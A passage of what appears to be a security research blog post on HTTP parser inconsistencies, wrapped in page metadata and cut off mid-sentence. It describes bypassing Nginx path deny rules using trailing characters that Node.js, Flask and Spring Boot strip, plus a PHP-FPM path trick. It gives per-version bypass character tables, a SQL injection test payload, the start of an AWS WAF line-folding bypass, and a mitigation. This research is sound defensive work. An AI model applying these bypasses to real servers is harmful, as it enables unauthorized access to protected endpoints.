Vulnerability\",\"parentId\":\"81f4c133-20bb-4d3e-afcf-117cf80024c6\"}],[{\"id\":\"b8bf3109-7624-4bf1-a074-a1c3d0bd7727\",\"level\":1,\"slug\":\"conclusion\",\"title\":\"Conclusion\",\"parentId\":null}]],\"noIndex\":false}","legacySeriesJSON":null,"headProps":{"title":"(Research) Exploiting HTTP Parsers Inconsistencies","description":"In this cybersecurity research, I'm going to show inconsistencies within HTTP parsers of various web applications. [Cache Poisoning, Desync Attacks, SSRF].","author":{"name":"Rafael da Costa Santos","username":"rafax00"},"links":[{"rel":"canonical","href":"https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies"}],"pageType":"article","bannerType":"large","ogSiteName":"Rafa's Blog","url":"https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies","ogImage":"https://hashnode.com/utility/r?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1687022613860%2F91867fcc-2a19-4dfb-8fd5-5758b016ad37.avif%3Fw%3D1200%26auto%3Dcompress%2Cformat%26format%3Dwebp%26fm%3Dpng","twitterImage":"https://hashnode.com/utility/r?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1687022613860%2F91867fcc-2a19-4dfb-8fd5-5758b016ad37.avif%3Fw%3D1200%26auto%3Dcompress%2Cformat%26format%3Dwebp%26fm%3Dpng","twitterHandle":"","monetization":null,"style":{},"customHeadItems":{"customFavicon":"https://cdn.hashnode.com/res/hashnode/image/upload/v1686748925239/Z6OQdUJ0q.gif?auto=format,compress\u0026gif-q=60\u0026format=webm\u0026fm=png","customTheme":"#0f172a","customMeta":null},"hljs":true},"isDarkTheme":false,"headerColor":"#0f172a","isBadge":null,"isRecommendations":null,"isHome":null,"currentMenuId":null,"hnmcMode":false,"postCUID":"clj09rtsw000109le1k4xblen","seoSchema":{"@context":"https://schema.org","@type":"NewsArticle","url":"https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies","mainEntityOfPage":"https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies","headline":"Exploiting HTTP Parsers Inconsistencies","description":"The HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\nIn this resea...","datePublished":"2023-06-17T17:25:25.280Z","dateModified":"2023-10-23T11:36:22.929Z","isAccessibleForFree":true,"author":{"@type":"Person","name":"Rafael da Costa Santos","url":"https://hashnode.com/@rafax00"},"publisher":{"@type":"Organization","name":"Rafa's Blog","url":"https://rafa.hashnode.dev","logo":"https://hashnode.com/utility/r?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1559814205701%2Fek9fO-yT0.jpeg%3Fw%3D800%26bm%3Dnormal%26balph%3D100%26txt64%3DUmFmYSdzIEJsb2c%26txtsize%3D42%26txtfit%3Dmax%26txtalign%3Dmiddle%2Ccenter%26txtfont%3DHelvetica%20Neue%2CBold%26txtclr%3Dffffff%26blend%3D0f172a"},"image":{"@type":"ImageObject","url":"https://cdn.hashnode.com/res/hashnode/image/upload/v1686855768304/932a6fc8-23cf-429f-88e2-bee9d6c0d010.png"}},"publication":{"__typename":"Publication","id":"6488d69906c1659c6d332ff6","url":"https://rafa.hashnode.dev","canonicalURL":"https://rafa.hashnode.dev","urlPattern":"SIMPLE","title":"Rafa's Blog","displayTitle":"","hasBadges":true,"descriptionSEO":"This is my security research blog!\n","about":{"html":"\u003cp\u003eThis is my security research blog!\u003c/p\u003e\n","text":"This is my security research blog!\n"},"features":{"newsletter":{"isEnabled":true},"viewCount":{"isEnabled":false},"readTime":{"isEnabled":false},"textSelectionSharer":{"isEnabled":true},"customCSS":{"isEnabled":false,"published":null,"draft":null}},"metaTags":null,"ogMetaData":{"image":"https://cdn.hashnode.com/res/hashnode/image/upload/v1687022404075/tXTvi1WB-.gif"},"author":{"__typename":"User","id":"6488d661432e5a15756c1a03","name":"Rafael da Costa Santos","username":"rafax00","profilePicture":"https://cdn.hashnode.com/res/hashnode/image/upload/v1686786296994/qxI_lhzL_.gif"},"preferences":{"__typename":"Preferences","logo":null,"darkMode":{"__typename":"DarkModePreferences","logo":null,"enabled":false},"navbarItems":[{"__typename":"PublicationNavbarItem","id":"648deaa267a3e6fc49d12f9e","label":"sponsor me","url":"https://rafa.hashnode.dev/sponsor","priority":0,"type":"link","series":null,"page":null}],"enabledPages":{"__typename":"PagesPreferences","badges":true,"newsletter":true,"members":null},"layout":"grid","disableFooterBranding":false,"isSubscriptionModalDisabled":false},"favicon":"https://cdn.hashnode.com/res/hashnode/image/upload/v1686748925239/Z6OQdUJ0q.gif","headerColor":"#0f172a","integrations":{"fbPixelID":null,"fathomSiteID":null,"fathomCustomDomainEnabled":null,"fathomCustomDomain":null,"hotjarSiteID":null,"matomoSiteID":null,"matomoURL":null,"gaTrackingID":null,"plausibleAnalyticsEnabled":null},"imprintV2":null,"postsCount":{"totalDocuments":3},"isTeam":false,"links":{"twitter":"https://twitter.com/rafabyte_","instagram":"","github":"https://github.com/rafax00","website":"","hashnode":"https://hashnode.com/@rafax00","youtube":"","dailydev":"","linkedin":"https://www.linkedin.com/in/rafael-da-costa-santos-9685a5172/","mastodon":""},"domainInfo":{"__typename":"DomainInfo","hashnodeSubdomain":"rafa","domain":null,"wwwPrefixedDomain":null},"redirectionRules":[],"totalRecommendedPublications":0,"sponsorship":{"content":{"html":"\u003cp\u003eIf you've found value in my blog and would like to support its continued growth, I invite you to consider becoming a sponsor. By sponsoring my blog, you can make a direct and meaningful impact on the quality and frequency of the content I provide.\u003c/p\u003e\n","markdown":"If you've found value in my blog and would like to support its continued growth, I invite you to consider becoming a sponsor. By sponsoring my blog, you can make a direct and meaningful impact on the quality and frequency of the content I provide."},"stripe":{"connected":true,"accountId":"acct_1NK2WzIqhGEy5ZXI","country":"BR"}},"pro":null,"allowContributorEdits":true,"rssImport":null,"post":{"id":"648dec85578b47894c6af863","cuid":"clj09rtsw000109le1k4xblen","title":"Exploiting HTTP Parsers Inconsistencies","subtitle":"Unveiling Vulnerabilities in HTTP Parsers: Exploiting Inconsistencies for Security Breaches","slug":"exploiting-http-parsers-inconsistencies","brief":"The HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\nIn this resea...","featured":true,"publishedAt":"2023-06-17T17:25:25.280Z","updatedAt":"2023-10-23T11:36:22.929Z","author":{"__typename":"User","id":"6488d661432e5a15756c1a03","name":"Rafael da Costa Santos","username":"rafax00","deactivated":false,"profilePicture":"https://cdn.hashnode.com/res/hashnode/image/upload/v1686786296994/qxI_lhzL_.gif","isPro":false,"bio":{"html":"\u003cp\u003eI'm Rafael, a Cybersecurity Analyst at SiDi with a strong focus on web applications. With a solid background in cybersecurity and a passion for uncovering vulnerabilities, I also have had the privilege of working with several Big Tech companies through Bug Bounty programs.\u003c/p\u003e\n"},"socialMediaLinks":{"website":"","github":"https://github.com/rafax00","twitter":"","facebook":"","stackoverflow":"","linkedin":"https://www.linkedin.com/in/rafael-da-costa-santos-9685a5172/"}},"coAuthors":[],"seo":{"title":"(Research) Exploiting HTTP Parsers Inconsistencies","description":"In this cybersecurity research, I'm going to show inconsistencies within HTTP parsers of various web applications. [Cache Poisoning, Desync Attacks, SSRF].","shouldNotIndex":false},"coverImage":{"url":"https://cdn.hashnode.com/res/hashnode/image/upload/v1686855768304/932a6fc8-23cf-429f-88e2-bee9d6c0d010.png","isPortrait":false,"attribution":null,"isAttributionHidden":false,"photographer":null},"responseCount":4,"reactionCount":43,"replyCount":2,"content":{"html":"\u003cp\u003eThe HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\u003c/p\u003e\n\u003cp\u003eIn this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers. By investigating these disparities, I aim to shed light on potential new vulnerabilities that involve HTTP Desync attacks.\u003c/p\u003e\n\u003cp\u003eIt was my first security research, I started on this journey in December 2021 and concluded in April 2022. I tried to be creative in finding new attack vectors due to incorrect HTTP parsing. In this post, I will share the final results of this study.\u003c/p\u003e\n\u003ch1 id=\"heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules\"\u003ePathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules\u003c/h1\u003e\n\u003cp\u003eThis section of the research focuses on the exploitable vulnerabilities arising from pathname manipulation in web servers, principally about the use of \u003ccode\u003etrim()\u003c/code\u003e or \u003ccode\u003estrip()\u003c/code\u003e functions. By exploiting these techniques, attackers can circumvent security rules specific to certain paths in reverse proxies and load balancers, posing a significant threat to web application security.\u003c/p\u003e\n\u003cp\u003eIn this section, we delve into the intricacies of how web servers process and manipulate pathnames, investigating the impact of the removal of certain characters, which can lead to unintended behaviors.\u003c/p\u003e\n\u003ch2 id=\"heading-nginx-acl-rules\"\u003eNginx ACL Rules\u003c/h2\u003e\n\u003cp\u003eNginx is a powerful web server and reverse proxy which allows developers to apply security rules on HTTP requests. This section explores security threads of the capabilities of Nginx in rewriting or blocking HTTP messages, with a primary focus on rules triggered by specific strings or regular expressions found within the HTTP pathname section.\u003c/p\u003e\n\u003cp\u003eIn Nginx, the \"location\" rule enables developers to define specific directives and behaviors based on the requested URL. This rule acts as a key component in routing and processing incoming HTTP requests, allowing control over how different URLs are handled.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-plaintext\"\u003elocation = /admin {\n    deny all;\n}\n\nlocation = /admin/ {\n    deny all;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe above Nginx rule aims to deny every access to the \u003ccode\u003e/admin\u003c/code\u003e endpoint, so if a user tries to access this endpoint, Nginx will return \u003ccode\u003e403\u003c/code\u003e and will not pass the HTTP message to the web server.\u003c/p\u003e\n\u003cp\u003eTo prevent security issues on URI-based rules, Nginx performs path normalization before checking them. Path normalization in Nginx refers to the process of transforming and standardizing requested URLs to a consistent and canonical format before handling them. It involves removing redundant or unnecessary elements from the URL path, such as extra slashes, dot segments, processing path traversal, and URL-encoded characters, to ensure uniformity and proper routing within the web server.\u003c/p\u003e\n\u003ch2 id=\"heading-trim-inconsistencies\"\u003eTrim Inconsistencies\u003c/h2\u003e\n\u003cp\u003eBefore we proceed, we need to understand what the \u003ccode\u003etrim()\u003c/code\u003e function does in different languages.\u003c/p\u003e\n\u003cp\u003eDifferent languages remove different characters when the correspondent function for \u003ccode\u003etrim()\u003c/code\u003e is called. Each server will normalize the pathname based on its \u003ccode\u003etrim()\u003c/code\u003e, removing different characters. But Nginx which is written in C, does not cover all characters for all languages.\u003c/p\u003e\n\u003cp\u003eE.g.: Python removes the character \u003ccode\u003e\\x85\u003c/code\u003e with \u003ccode\u003estrip()\u003c/code\u003e, and JavaScript does not with \u003ccode\u003etrim()\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686750781066/bf6a391a-2bf5-4605-9e5e-8cc0f059a995.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686750895455/784cf8a4-b070-4bb6-abd0-12ae887d568c.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cp\u003eIf an HTTP message is parsed using the \u003ccode\u003etrim()\u003c/code\u003e function in different languages, an HTTP Desync attack can occur.\u003c/p\u003e\n\u003ch2 id=\"heading-bypassing-nginx-acl-rules-with-nodejs\"\u003eBypassing Nginx ACL Rules With Node.js\u003c/h2\u003e\n\u003cp\u003eLet's consider the following Nginx ACL rule and Node.js API source code using Express:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-plaintext\"\u003elocation = /admin {\n    deny all;\n}\n\nlocation = /admin/ {\n    deny all;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"lang-javascript\"\u003eapp.get(\u003cspan class=\"hljs-string\"\u003e'/admin'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e res.send(\u003cspan class=\"hljs-string\"\u003e'ADMIN'\u003c/span\u003e);\n});\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFollowing the \u003ccode\u003etrim()\u003c/code\u003e logic, Node.js \"ignores\" the characters \u003ccode\u003e\\x09\u003c/code\u003e, \u003ccode\u003e\\xa0\u003c/code\u003e, and \u003ccode\u003e\\x0c\u003c/code\u003e from the pathname, but Nginx considers them as part of the URL:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686751453300/0531fc1a-9599-4a00-aa94-21cca2db557c.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eFirst, Nginx receives the HTTP request and performs path normalization on the pathname;\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eAs Nginx includes the character \u003ccode\u003e\\xa0\u003c/code\u003e as part of the pathname, the ACL rule for the \u003ccode\u003e/admin\u003c/code\u003e URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eWhen the URI \u003ccode\u003e/admin\\x0a\u003c/code\u003e is received by the Node.js server, the character \u003ccode\u003e\\xa0\u003c/code\u003e will be removed, allowing successful retrieval of the \u003ccode\u003e/admin\u003c/code\u003e endpoint.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eBelow is a graphical demonstration of what happens with the HTTP request:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686752151660/84ec1c49-2df9-4a44-ab01-1d798ef0564f.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cp\u003eTo gain a clearer understanding of how this vulnerability can be exploited, I recommend watching the accompanying proof of concept video below:\u003c/p\u003e\n\u003cdiv class=\"embed-wrapper\"\u003e\u003cdiv class=\"embed-loading\"\u003e\u003cdiv class=\"loadingRow\"\u003e\u003c/div\u003e\u003cdiv class=\"loadingRow\"\u003e\u003c/div\u003e\u003c/div\u003e\u003ca class=\"embed-card\" href=\"https://www.youtube.com/watch?v=sgs3s5oTfz8\"\u003ehttps://www.youtube.com/watch?v=sgs3s5oTfz8\u003c/a\u003e\u003c/div\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cp\u003eBelow is a table correlating Nginx versions with characters that can potentially lead to bypassing URI ACL rules when using Node.js as the backend:\u003c/p\u003e\n\u003cdiv class=\"hn-table\"\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003ctd\u003eNginx Version\u003c/td\u003e\u003ctd\u003e\u003cstrong\u003eNode.js Bypass Characters\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.22.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.21.6\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.20.2\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\xA0\u003c/code\u003e, \u003ccode\u003e\\x09\u003c/code\u003e, \u003ccode\u003e\\x0C\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.18.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\xA0\u003c/code\u003e, \u003ccode\u003e\\x09\u003c/code\u003e, \u003ccode\u003e\\x0C\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.16.1\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\xA0\u003c/code\u003e, \u003ccode\u003e\\x09\u003c/code\u003e, \u003ccode\u003e\\x0C\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003c/div\u003e\u003ch2 id=\"heading-bypassing-nginx-acl-rules-with-flask\"\u003eBypassing Nginx ACL Rules With Flask\u003c/h2\u003e\n\u003cp\u003eFlask removes the characters \u003ccode\u003e\\x85\u003c/code\u003e, \u003ccode\u003e\\xA0\u003c/code\u003e, \u003ccode\u003e\\x1F\u003c/code\u003e, \u003ccode\u003e\\x1E\u003c/code\u003e, \u003ccode\u003e\\x1D\u003c/code\u003e, \u003ccode\u003e\\x1C\u003c/code\u003e, \u003ccode\u003e\\x0C\u003c/code\u003e, \u003ccode\u003e\\x0B\u003c/code\u003e, and \u003ccode\u003e\\x09\u003c/code\u003e from the URL path, but NGINX doesn't.\u003c/p\u003e\n\u003cp\u003eTake the following nginx configuration/API source code as a reference:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-plaintext\"\u003elocation = /admin {\n    deny all;\n}\n\nlocation = /admin/ {\n    deny all;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"lang-python\"\u003e\u003cspan class=\"hljs-meta\"\u003e@app.route('/admin', methods = ['GET'])\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eadmin\u003c/span\u003e():\u003c/span\u003e\n    data = {\u003cspan class=\"hljs-string\"\u003e\"url\"\u003c/span\u003e:request.url, \u003cspan class=\"hljs-string\"\u003e\"admin\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"True\"\u003c/span\u003e}\n\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e Response(str(data), mimetype=\u003cspan class=\"hljs-string\"\u003e\"application/json\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs you can see below, it's possible to circumvent the ACL protection by adding the character \u003ccode\u003e\\x85\u003c/code\u003e at the end of the pathname:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686753386536/4032be9b-c7f3-48ae-8074-5d9ad1f9e7a5.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cdiv class=\"hn-table\"\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003ctd\u003eNginx Version\u003c/td\u003e\u003ctd\u003e\u003cstrong\u003eFlask Bypass Characters\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.22.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\x85\u003c/code\u003e, \u003ccode\u003e\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.21.6\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\x85\u003c/code\u003e, \u003ccode\u003e\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.20.2\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\x85\u003c/code\u003e, \u003ccode\u003e\\xA0\u003c/code\u003e, \u003ccode\u003e\\x1F\u003c/code\u003e, \u003ccode\u003e\\x1E\u003c/code\u003e, \u003ccode\u003e\\x1D\u003c/code\u003e, \u003ccode\u003e\\x1C\u003c/code\u003e, \u003ccode\u003e\\x0C\u003c/code\u003e, \u003ccode\u003e\\x0B\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.18.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\x85\u003c/code\u003e, \u003ccode\u003e\\xA0\u003c/code\u003e, \u003ccode\u003e\\x1F\u003c/code\u003e, \u003ccode\u003e\\x1E\u003c/code\u003e, \u003ccode\u003e\\x1D\u003c/code\u003e, \u003ccode\u003e\\x1C\u003c/code\u003e, \u003ccode\u003e\\x0C\u003c/code\u003e, \u003ccode\u003e\\x0B\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.16.1\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\x85\u003c/code\u003e, \u003ccode\u003e\\xA0\u003c/code\u003e, \u003ccode\u003e\\x1F\u003c/code\u003e, \u003ccode\u003e\\x1E\u003c/code\u003e, \u003ccode\u003e\\x1D\u003c/code\u003e, \u003ccode\u003e\\x1C\u003c/code\u003e, \u003ccode\u003e\\x0C\u003c/code\u003e, \u003ccode\u003e\\x0B\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003c/div\u003e\u003ch2 id=\"heading-bypassing-nginx-acl-rules-with-spring-boot\"\u003eBypassing Nginx ACL Rules With Spring Boot\u003c/h2\u003e\n\u003cp\u003eSpring removes the characters \u003ccode\u003e\\x09\u003c/code\u003e and \u003ccode\u003e\\x3B\u003c/code\u003e from the URL path, but Nginx doesn't.\u003c/p\u003e\n\u003cp\u003eTake the following Nginx configuration/API source code as a reference:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-plaintext\"\u003elocation = /admin {\n    deny all;\n}\n\nlocation = /admin/ {\n    deny all;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"lang-java\"\u003e\u003cspan class=\"hljs-meta\"\u003e@GetMapping(\"/admin\")\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003epublic\u003c/span\u003e String \u003cspan class=\"hljs-title\"\u003eadmin\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Greetings from Spring Boot!\"\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBelow, you will find a demonstration of how ACL protection can be circumvented by adding the character \u003ccode\u003e\\x09\u003c/code\u003e or \u003ccode\u003e\\t\u003c/code\u003e at the end of the pathname:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686753921718/b3f91ea3-558f-4889-860c-15cdc02cb7f6.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cdiv class=\"hn-table\"\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003ctd\u003eNginx Version\u003c/td\u003e\u003ctd\u003e\u003cstrong\u003eSpring Boot Bypass Characters\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.22.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.21.6\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.20.2\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\x09\u003c/code\u003e, \u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.18.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\x09\u003c/code\u003e, \u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.16.1\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\x09\u003c/code\u003e, \u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003c/div\u003e\u003ch2 id=\"heading-bypassing-nginx-acl-rules-with-php-fpm-integration\"\u003eBypassing Nginx ACL Rules With PHP-FPM Integration\u003c/h2\u003e\n\u003cp\u003ePHP-FPM (FastCGI Process Manager) is a robust and high-performance PHP FastCGI implementation that works seamlessly with Nginx. It serves as a standalone server for handling PHP requests, improving the speed and efficiency of PHP execution. Nginx acts as a reverse proxy, receiving incoming HTTP requests and passing them to PHP-FPM for processing.\u003c/p\u003e\n\u003cp\u003eLet's consider the following Nginx FPM configuration:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-plaintext\"\u003elocation = /admin.php {\n    deny all;\n}\n\nlocation ~ \\.php$ {\n    include snippets/fastcgi-php.conf;\n    fastcgi_pass unix:/run/php/php8.1-fpm.sock;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen two \u003ccode\u003e.php\u003c/code\u003e files are in the same pathname of the HTTP request, PHP will match the first one, ignoring everything after the slash. Since the Nginx is configured to block requests to the specific endpoint \u003ccode\u003e/admin.php\u003c/code\u003e, it's possible to access the admin.php file by doing the following request:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686758750001/66ac562a-7da9-4397-a76a-1d641474e000.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cp\u003eBelow is a graphical example of how the applications interpret the HTTP request:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686758967146/03073365-9dbf-4cf5-8762-1d705c9a038c.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cp\u003eThis technique only works if the second PHP file, in this case, \u003ccode\u003eindex.php\u003c/code\u003e, exists in the server structure. Take the following server code/structure as a reference:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686758832956/d0708099-48e0-46d0-b646-8bb92c51454a.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cp\u003eThese behaviors were reported to the Nginx security team in 2022, and they responded by saying that they don't have responsibility for it.\u003c/p\u003e\n\u003cp\u003eSince the research concluded in April 2022, newer versions of Nginx were not specifically tested. However, it is highly likely that the findings and vulnerabilities identified in the research are reproducible in the latest version of Nginx as well.\u003c/p\u003e\n\u003ch2 id=\"heading-how-to-prevent\"\u003eHow to prevent\u003c/h2\u003e\n\u003cp\u003eTo prevent these issues, you must use the \u003ccode\u003e~\u003c/code\u003e expression Instead of the \u003ccode\u003e=\u003c/code\u003e expression on Nginx ACL rules, for example:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-plaintext\"\u003elocation ~* ^/admin {\n    deny all;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003e~\u003c/code\u003e expression matches the string \u003ccode\u003e/admin\u003c/code\u003e in any part of the pathname, in other words, if a user sent a request to \u003ccode\u003e/admin1337\u003c/code\u003e, the request will also be blocked.\u003c/p\u003e\n\u003ch1 id=\"heading-bypassing-aws-waf-acl\"\u003eBypassing AWS WAF ACL\u003c/h1\u003e\n\u003ch2 id=\"heading-how-aws-waf-acls-work\"\u003eHow AWS WAF ACLs Work\u003c/h2\u003e\n\u003cp\u003eAWS ACL (Access Control List) rules are a component of load balancers, providing control over incoming and outgoing network traffic. These rules define access permissions based on specified conditions, allowing or denying requests to and from the load balancer.\u003c/p\u003e\n\u003cp\u003eYou can configure the AWS Web Application Firewall (WAF) ACL to examine and validate HTTP headers. AWS WAF ACL rules allow you to define conditions based on specific header attributes or values, enabling you to control and filter incoming requests.\u003c/p\u003e\n\u003cp\u003eHeader ACL example:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686762641000/8f9c4e41-c17a-48d6-b2f5-72d76217e337.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cp\u003eIn the above example, if a request contains a SQL Injection payload in the \u003ccode\u003eX-Query\u003c/code\u003e header, AWS WAF recognizes the SQL Injection attempt and responds with a \u003ccode\u003e403 Forbidden\u003c/code\u003e HTTP status code. This prevents the request from being forwarded to the backend, effectively blocking any potential exploitation of the application's database through SQL Injection attacks.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686763561032/d592bd74-2618-461d-9768-314549b691cf.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cp\u003eAs you can see, the above request carried the payload \u003ccode\u003e' or '1'='1' --\u003c/code\u003e at the \u003ccode\u003eX-Query\u003c/code\u003e header, and then was blocked by the AWS WAF.\u003c/p\u003e\n\u003ch2 id=\"heading-bypassing-aws-waf-acl-with-line-folding\"\u003eBypassing AWS WAF ACL With Line Folding\u003c/h2\u003e\n\u003cp\u003eWeb servers like Node.js, Flask and many others sometimes encounter a phenomenon known as \"line folding.\" Line folding refers to the practice of splitting long header values using the characters \\x09 (tab) and \\x20 (space) into multiple lines for readability. However, this behavior can lead to compatibility issues and potential security 